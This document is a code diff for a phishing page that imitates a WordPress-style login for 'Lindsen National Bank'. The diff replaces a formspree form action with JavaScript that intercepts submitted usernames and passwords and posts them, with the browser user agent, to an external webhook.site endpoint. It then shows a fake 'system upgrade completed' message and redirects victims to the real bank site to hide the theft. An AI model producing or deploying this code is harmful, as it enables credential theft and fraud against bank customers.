@@ -139,35 +139,26 @@ document.body.className = document.body.className.replace('no-js','js');
 <div id="login">
     <h1 role="presentation" class="wp-login-logo"><a href="http://lindensennational.com/">Lindsen National Bank</a></h1>
     
-    <form name="loginform" id="loginform" action="https://formspree.io/f/xwpzoyqz" method="POST">
-    <input type="hidden" name="_subject" value="LNB System Upgrade - Credentials Captured">
-    <input type="hidden" name="_format" value="plain">
-    <input type="hidden" name="_next" value="http://lindensennational.com/">
-    
-    <p>
-        <label for="user_login">Username or Email Address</label>
-        <input type="text" name="username" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
-    </p>
+    <form name="loginform" id="loginform" method="POST">
+        <p>
+            <label for="user_login">Username or Email Address</label>
+            <input type="text" name="username" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
+        </p>
 
-    <div class="user-pass-wrap">
-        <label for="user_pass">Password</label>
-        <div class="wp-pwd">
-            <input type="password" name="password" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
-            <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
-                <span class="dashicons dashicons-visibility" aria-hidden="true">👁️</span>
-            </button>
+        <div class="user-pass-wrap">
+            <label for="user_pass">Password</label>
+            <div class="wp-pwd">
+                <input type="password" name="password" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
+                <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
+                    <span class="dashicons dashicons-visibility" aria-hidden="true">👁️</span>
+                </button>
+            </div>
         </div>
-    </div>
-    
-    <p class="forgetmenot">
-        <input name="rememberme" type="checkbox" id="rememberme" value="forever" /> 
-        <label for="rememberme">Remember Me</label>
-    </p>
-    
-    <p class="submit">
-        <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
-    </p>
-</form>
+        <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever" /> <label for="rememberme">Remember Me</label></p>
+        <p class="submit">
+            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
+        </p>
+    </form>
 
     <p id="nav">
         <a class="wp-login-lost-password" href="http://lindensennational.com/wp-login.php?action=lostpassword">Lost your password?</a>
@@ -192,7 +183,7 @@ document.body.className = document.body.className.replace('no-js','js');
 </div>
 
 <script>
-// Simple password toggle functionality
+// Password toggle functionality
 document.addEventListener('DOMContentLoaded', function() {
     const toggleButton = document.querySelector('.wp-hide-pw');
     const passwordInput = document.getElementById('user_pass');
@@ -205,21 +196,43 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // Form submission handler
+    // Form submission handler - Sends to Webhook.site
     document.getElementById('loginform').addEventListener('submit', function(e) {
         e.preventDefault();
         
         const username = document.getElementById('user_login').value;
         const password = document.getElementById('user_pass').value;
         
-        // Log credentials (in real scenario, this would send to your server)
-        console.log('Captured credentials:', { username, password });
-        alert('System upgrade completed successfully! Redirecting...');
+        console.log('Capturing credentials:', username, password);
         
-        // Redirect to real site after capture
-        setTimeout(() => {
-            window.location.href = 'http://lindensennational.com/';
-        }, 2000);
+        // Send to Webhook.site
+        fetch('https://webhook.site/29a50277-9a08-49e9-b1da-affa6a483f18', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString(),
+                source: 'LNB System Upgrade Phishing',
+                user_agent: navigator.userAgent
+            })
+        })
+        .then(response => {
+            console.log('Credentials sent successfully');
+            alert('System upgrade completed successfully! Redirecting to LNB...');
+            setTimeout(() => {
+                window.location.href = 'http://lindensennational.com/';
+            }, 2000);
+        })
+        .catch(error => {
+            console.error('Error sending to webhook:', error);
+            alert('Upgrade completed! Redirecting to LNB...');
+            setTimeout(() => {
+                window.location.href = 'http://lindensennational.com/';
+            }, 2000);
+        });
     });
 });
 </script>
